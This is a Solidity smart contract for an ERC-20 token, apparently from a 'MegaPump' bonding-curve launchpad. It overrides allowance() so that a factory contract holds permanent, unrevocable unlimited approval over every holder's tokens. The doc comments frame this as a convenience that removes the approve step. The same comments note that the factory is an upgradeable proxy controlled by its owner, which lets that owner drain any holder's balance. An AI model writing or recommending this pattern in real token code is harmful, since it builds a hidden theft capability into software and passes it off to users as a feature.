// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

/// @title  MegaPumpToken — ERC-20 with factory as trusted operator
/// @notice Fixed supply of 1 billion tokens, 100% minted to the Factory on deployment.
/// @dev    The factory address is pre-approved as a trusted operator via allowance() override.
///         This means users can sell in a single TX with zero approve step —
///         no popup, no gas, nothing. The factory's transferFrom() always succeeds
///         because allowance() returns type(uint256).max for the factory address.
///         The factory is the only spender with this shortcut; every other spender
///         behaves like a standard ERC-20. The `factory` address is fixed at deployment
///         (immutable field) and points to the MegaPump bonding-curve contract, which is
///         itself a UUPS-upgradeable proxy governed by its owner.
contract MegaPumpToken is ERC20Permit {
    address public immutable factory;
    string public metadataURI;

    constructor(
        string memory _name,
        string memory _ticker,
        string memory _metadataURI,
        address _factory
    ) ERC20Permit(_name) ERC20(_name, _ticker) {
        factory = _factory;
        metadataURI = _metadataURI;
        _mint(_factory, 1_000_000_000 * 10 ** 18);
    }

    /// @notice The factory is always considered pre-approved for any amount.
    ///         For all other spenders, returns the real stored allowance (standard ERC-20).
    function allowance(address owner, address spender) public view override returns (uint256) {
        if (spender == factory) return type(uint256).max;
        return super.allowance(owner, spender);
    }
}
